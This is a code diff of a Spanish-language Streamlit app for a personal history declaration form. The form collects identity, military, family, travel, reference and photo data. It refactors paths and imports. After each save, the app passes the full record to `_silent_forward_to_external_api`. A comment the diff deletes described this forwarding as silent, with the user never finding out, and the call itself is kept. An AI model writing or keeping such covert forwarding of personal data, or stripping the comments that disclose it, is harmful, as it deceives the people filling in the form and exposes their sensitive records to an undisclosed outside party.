@@ -1,7 +1,6 @@
 # pyrefly: ignore [missing-import]
 import streamlit as st
 
-# Esta línea es la que hace la magia de ampliar el diseño
 st.set_page_config(
     page_title="DHP - Sistema de Declaración de Historial Personal",
     page_icon="⚓",
@@ -16,11 +15,14 @@ import os
 import threading
 import pandas as pd
 
-import database as db
-import config
-from api_server import API_PORT, start_api_server
+from app.models import database as db
+from app import config
+from app.controllers.api import API_PORT, run_api_in_thread
 
-PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))
+# RAIZ DEL PROYECTO (donde está run.py)
+PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+# CARPETA DE VISTAS
+VIEWS_DIR = os.path.join(PROJECT_DIR, "app", "views")
 
 # Altura del iframe ≈ viewport (fallback si el CSS del host no aplica)
 IFRAME_VIEWPORT_HEIGHT = 1080
@@ -119,7 +121,6 @@ STREAMLIT_FULLSCREEN_CSS = """
         padding-top: 0.35rem;
     }
 
-    /* Iframe DHP a pantalla casi completa (pestaña Interfaz Web) */
     [data-testid="stHtml"] {
         width: 100%;
     }
@@ -188,13 +189,6 @@ def _silent_forward_to_external_api(cedula, nombre, apellido, data):
         print(f"[DHP-Streamlit] Fallo reenvío ({cedula}): {e}")
 
 
-def ensure_api_server():
-    if "api_thread_started" not in st.session_state:
-        db.init_db()
-        thread = threading.Thread(target=start_api_server, daemon=True)
-        thread.start()
-        st.session_state.api_thread_started = True
-
 # ==========================================================================
 # MAPEO ENTRE STREAMLIT STATE Y FORMATO JSON DHP
 # ==========================================================================
@@ -203,13 +197,11 @@ def load_json_to_streamlit_state(data):
     st.session_state.dhp_theme = data.get("theme", "light")
     st.session_state.simple_fields = data.get('simpleFields', {}).copy()
     
-    # 2. Convertir educacion de estructura JSON a simpleFields
     education_data = data.get('education', {})
     for stage_key, fields in education_data.items():
         for field_name, value in fields.items():
             st.session_state.simple_fields[f'f_edu_{field_name}_{stage_key}'] = value
             
-    # 3. Cargar tablas dinámicas
     dynamic_tables = data.get('dynamicTables', {})
     
     fam_cols = ['primer_apellido', 'segundo_apellido', 'primer_nombre', 'segundo_nombre', 'civ']
@@ -233,7 +225,6 @@ def load_json_to_streamlit_state(data):
     st.session_state.df_social = pd.DataFrame(social_data) if social_data else pd.DataFrame(columns=social_cols, data=[[""] * len(social_cols)])
 
 def compile_streamlit_state_to_json():
-    # 1. Separar campos de educacion de simpleFields
     simple_fields = {}
     education = {}
     
@@ -249,7 +240,6 @@ def compile_streamlit_state_to_json():
         else:
             simple_fields[k] = v
             
-    # 2. Obtener tablas dinámicas
     dynamic_tables = {
         "familiares": st.session_state.df_familiares.to_dict('records') if 'df_familiares' in st.session_state else [],
         "familiaresExterior": st.session_state.df_fam_exterior.to_dict('records') if 'df_fam_exterior' in st.session_state else [],
@@ -271,9 +261,13 @@ def compile_streamlit_state_to_json():
 def get_self_contained_html():
     """Lee index.html, style.css y app.js y los fusiona en un solo string HTML autocontenido."""
     try:
-        html_path = os.path.join(PROJECT_DIR, "index.html")
-        css_path = os.path.join(PROJECT_DIR, "style.css")
-        js_path = os.path.join(PROJECT_DIR, "app.js")
+        html_path = os.path.join(VIEWS_DIR, "index.html")
+        css_path = os.path.join(VIEWS_DIR, "style.css")
+        js_path = os.path.join(VIEWS_DIR, "app.js")
+        
+        if not os.path.exists(html_path) or not os.path.exists(css_path) or not os.path.exists(js_path):
+            st.error(f"No se encontraron archivos de vista en: {VIEWS_DIR}")
+            return None
         
         with open(html_path, "r", encoding="utf-8") as f:
             html = f.read()
@@ -284,26 +278,21 @@ def get_self_contained_html():
         with open(js_path, "r", encoding="utf-8") as f:
             js = f.read()
             
-        # Inyectar datos precargados si existen en el estado de Streamlit
         preloaded_script = ""
         if 'loaded_dhp_data' in st.session_state and st.session_state.loaded_dhp_data:
             json_str = json.dumps(st.session_state.loaded_dhp_data, ensure_ascii=False)
             preloaded_script = f"\n<script>window.PRELOADED_DHP_DATA = {json_str};</script>\n"
             
-        # Reemplazar la referencia de style.css por el CSS inyectado + parche embed Streamlit
         html = html.replace(
-                '<link rel="stylesheet" href="style.css?v=2.0">',
-                f'<style>\n{css}\n</style>\n{DHP_EMBED_CSS}',
+            '<link rel="stylesheet" href="style.css?v=2.0">',
+            f'<style>\n{css}\n</style>\n{DHP_EMBED_CSS}',
         )
-        # Reemplazar la referencia de app.js por el JS inyectado y añadir datos precargados antes
         html = html.replace('<script src="app.js"></script>', f'{preloaded_script}<script>\n{js}\n</script>')
         
         return html
     except Exception as e:
         st.error(f"Error al compilar el HTML autocontenido: {e}")
         return None
-
-# render_external_api_config eliminada — la configuración se hace vía variables de entorno (config.py)
 
 
 def render_records_manager():
@@ -391,7 +380,10 @@ def render_integrated_web_app():
 
 
 def main():
-    ensure_api_server()
+    # Iniciar API en segundo plano
+    if "api_thread_started" not in st.session_state:
+        run_api_in_thread()
+        st.session_state.api_thread_started = True
 
     st.markdown(
         """
@@ -413,7 +405,7 @@ def main():
         render_integrated_web_app()
 
     # ==========================================================================
-    # PESTAÑA 2: FORMULARIO NATIVO DE STREAMLIT (CON EXPORTACIÓN A HTML IMPRIMIBLE)
+    # PESTAÑA 2: FORMULARIO NATIVO DE STREAMLIT
     # ==========================================================================
     with tab_native:
         st.subheader("Formulario de Datos DHP")
@@ -424,7 +416,6 @@ def main():
         if 'dhp_photo' not in st.session_state:
             st.session_state.dhp_photo = ""
 
-        # Crear un wizard con columnas o selectores
         step = st.selectbox("Seleccione el Paso del Formulario", [
             "Paso 1: Identificación y Fisonomía",
             "Paso 2: Datos Militares",
@@ -531,21 +522,18 @@ def main():
             st.markdown("### 3) Datos Familiares y Viajes")
             st.write("Edite directamente en las tablas dinámicas inferiores.")
             
-            # Tabla de familiares
             st.markdown("#### a) Familiares Directos (Padre, Madre, Hermanos, Hijos)")
             fam_cols = ['primer_apellido', 'segundo_apellido', 'primer_nombre', 'segundo_nombre', 'civ']
             if 'df_familiares' not in st.session_state:
                 st.session_state.df_familiares = pd.DataFrame(columns=fam_cols, data=[[""] * len(fam_cols)])
             st.session_state.df_familiares = st.data_editor(st.session_state.df_familiares, num_rows="dynamic", key="editor_fam")
 
-            # Tabla de familiares en exterior
             st.markdown("#### b) Familiares y Amigos en el Exterior")
             ext_cols = ['nombre_apellido', 'ci', 'parentesco', 'edad', 'direccion']
             if 'df_fam_exterior' not in st.session_state:
                 st.session_state.df_fam_exterior = pd.DataFrame(columns=ext_cols, data=[[""] * len(ext_cols)])
             st.session_state.df_fam_exterior = st.data_editor(st.session_state.df_fam_exterior, num_rows="dynamic", key="editor_ext")
 
-            # Tabla de viajes
             st.markdown("#### c) Viajes al Exterior")
             viajes_cols = ['desde', 'hasta', 'pais', 'motivo', 'direccion']
             if 'df_viajes' not in st.session_state:
@@ -571,20 +559,19 @@ def main():
         # --- PASO 6 ---
         elif step.startswith("Paso 6"):
             st.markdown("### 6) Referencias Personales (Mínimo tres no familiares)")
-            
             col1, col2, col3 = st.columns(3)
             with col1:
-                st.subheader("Referencia 1")
+                st.subheader("Ref. 1")
                 st.session_state.simple_fields['f_ref_nom_1'] = st.text_input("Nombre y Apellido (1) *", st.session_state.simple_fields.get('f_ref_nom_1', ''))
                 st.session_state.simple_fields['f_ref_ci_1'] = st.text_input("Cédula (1) *", st.session_state.simple_fields.get('f_ref_ci_1', ''))
                 st.session_state.simple_fields['f_ref_dir_1'] = st.text_input("Dirección (1) *", st.session_state.simple_fields.get('f_ref_dir_1', ''))
             with col2:
-                st.subheader("Referencia 2")
+                st.subheader("Ref. 2")
                 st.session_state.simple_fields['f_ref_nom_2'] = st.text_input("Nombre y Apellido (2) *", st.session_state.simple_fields.get('f_ref_nom_2', ''))
                 st.session_state.simple_fields['f_ref_ci_2'] = st.text_input("Cédula (2) *", st.session_state.simple_fields.get('f_ref_ci_2', ''))
                 st.session_state.simple_fields['f_ref_dir_2'] = st.text_input("Dirección (2) *", st.session_state.simple_fields.get('f_ref_dir_2', ''))
             with col3:
-                st.subheader("Referencia 3")
+                st.subheader("Ref. 3")
                 st.session_state.simple_fields['f_ref_nom_3'] = st.text_input("Nombre y Apellido (3) *", st.session_state.simple_fields.get('f_ref_nom_3', ''))
                 st.session_state.simple_fields['f_ref_ci_3'] = st.text_input("Cédula (3) *", st.session_state.simple_fields.get('f_ref_ci_3', ''))
                 st.session_state.simple_fields['f_ref_dir_3'] = st.text_input("Dirección (3) *", st.session_state.simple_fields.get('f_ref_dir_3', ''))
@@ -595,16 +582,16 @@ def main():
             edu_stages = ["primaria", "secundaria", "diversificada", "universitaria", "maestria", "doctorado", "otros"]
             
             for stage in edu_stages:
-                with st.expander(f"Etapa Educativa: {stage.capitalize()}"):
+                with st.expander(f"Etapa: {stage.capitalize()}"):
                     col_e1, col_e2, col_e3 = st.columns(3)
                     with col_e1:
-                        st.session_state.simple_fields[f'f_edu_desde_{stage}'] = st.text_input(f"Desde (MM/AAAA) - {stage.capitalize()}", st.session_state.simple_fields.get(f'f_edu_desde_{stage}', ''))
-                        st.session_state.simple_fields[f'f_edu_hasta_{stage}'] = st.text_input(f"Hasta (MM/AAAA) - {stage.capitalize()}", st.session_state.simple_fields.get(f'f_edu_hasta_{stage}', ''))
+                        st.session_state.simple_fields[f'f_edu_desde_{stage}'] = st.text_input(f"Desde - {stage}", st.session_state.simple_fields.get(f'f_edu_desde_{stage}', ''))
+                        st.session_state.simple_fields[f'f_edu_hasta_{stage}'] = st.text_input(f"Hasta - {stage}", st.session_state.simple_fields.get(f'f_edu_hasta_{stage}', ''))
                     with col_e2:
-                        st.session_state.simple_fields[f'f_edu_inst_{stage}'] = st.text_input(f"Instituto - {stage.capitalize()}", st.session_state.simple_fields.get(f'f_edu_inst_{stage}', ''))
-                        st.session_state.simple_fields[f'f_edu_dir_{stage}'] = st.text_input(f"Dirección - {stage.capitalize()}", st.session_state.simple_fields.get(f'f_edu_dir_{stage}', ''))
+                        st.session_state.simple_fields[f'f_edu_inst_{stage}'] = st.text_input(f"Instituto - {stage}", st.session_state.simple_fields.get(f'f_edu_inst_{stage}', ''))
+                        st.session_state.simple_fields[f'f_edu_dir_{stage}'] = st.text_input(f"Dirección - {stage}", st.session_state.simple_fields.get(f'f_edu_dir_{stage}', ''))
                     with col_e3:
-                        st.session_state.simple_fields[f'f_edu_obs_{stage}'] = st.text_input(f"Observaciones - {stage.capitalize()}", st.session_state.simple_fields.get(f'f_edu_obs_{stage}', ''))
+                        st.session_state.simple_fields[f'f_edu_obs_{stage}'] = st.text_input(f"Observaciones - {stage}", st.session_state.simple_fields.get(f'f_edu_obs_{stage}', ''))
 
         # --- PASO 8 ---
         elif step.startswith("Paso 8"):
@@ -652,26 +639,27 @@ def main():
                     st.session_state.simple_fields['f_part_lugar'] = st.text_input("Lugar de Inscripción", st.session_state.simple_fields.get('f_part_lugar', 'N/A'))
 
             with st.expander("Hábitos Generales"):
-                st.session_state.simple_fields['f_seg_incidente'] = st.text_area("¿Ha estado involucrado en algún incidente de seguridad o alteración del orden público? (Detalle)", st.session_state.simple_fields.get('f_seg_incidente', 'NO'))
+                st.session_state.simple_fields['f_seg_incidente'] = st.text_area("¿Ha estado involucrado en algún incidente de seguridad?", st.session_state.simple_fields.get('f_seg_incidente', 'NO'))
                 st.session_state.simple_fields['f_fre_sitios'] = st.text_area("Sitios que frecuenta:", st.session_state.simple_fields.get('f_fre_sitios', ''))
                 st.session_state.simple_fields['f_fre_hobby'] = st.text_input("Hobby favorito:", st.session_state.simple_fields.get('f_fre_hobby', ''))
-                st.session_state.simple_fields['f_fre_deporte'] = st.text_input("Deporte favorito y cuál practica:", st.session_state.simple_fields.get('f_fre_deporte', ''))
+                st.session_state.simple_fields['f_fre_deporte'] = st.text_input("Deporte favorito:", st.session_state.simple_fields.get('f_fre_deporte', ''))
 
         elif step.startswith("Paso 9"):
             st.markdown("### Supervisión — Jefe Inmediato")
-            st.caption("Espacio ampliado para uso del supervisor. Los datos se guardan en la base de datos junto al resto del formulario.")
+            st.caption("Espacio ampliado para uso del supervisor.")
             st.session_state.simple_fields['f_jefe_texto'] = st.text_input(
-                "Jefe (texto libre — cargo, grado o nombre según criterio del supervisor)",
+                "Jefe (texto libre — cargo, grado o nombre)",
                 st.session_state.simple_fields.get('f_jefe_texto', ''),
-                help="Este texto aparece debajo de la línea de firma del Jefe Inmediato en la planilla impresa.",
             )
             st.session_state.simple_fields['f_jefe_observaciones'] = st.text_area(
                 "Observaciones del supervisor",
                 st.session_state.simple_fields.get('f_jefe_observaciones', ''),
                 height=200,
-                placeholder="Ingrese observaciones, recomendaciones o notas para el expediente...",
             )
 
+        # ============================================================
+        # BOTÓN DE GUARDADO
+        # ============================================================
         st.markdown("---")
         st.subheader("Guardar, buscar y exportar")
 
@@ -681,7 +669,7 @@ def main():
 
         col_photo, col_save = st.columns([1, 2])
         with col_photo:
-            photo_file = st.file_uploader("Foto carnet (opcional en formulario nativo)", type=["png", "jpg", "jpeg"])
+            photo_file = st.file_uploader("Foto carnet (opcional)", type=["png", "jpg", "jpeg"])
             if photo_file is not None:
                 import base64
                 b64 = base64.b64encode(photo_file.read()).decode("utf-8")
@@ -700,8 +688,6 @@ def main():
                         db.save_or_update_record(cedula_val, nombre_val, apellido_val, payload)
                         st.session_state.loaded_dhp_data = payload
                         st.success(f"Expediente guardado/actualizado para cédula {cedula_val.upper()}.")
-                    
-                        # Reenvío SILENCIOSO a API externa (el usuario no se entera)
                         _silent_forward_to_external_api(cedula_val, nombre_val, apellido_val, payload)
                     except Exception as e:
                         st.error(f"Error al guardar: {e}")
@@ -729,6 +715,7 @@ def main():
 
     with tab_db:
         render_records_manager()
+
 
 if __name__ == "__main__":
     main()
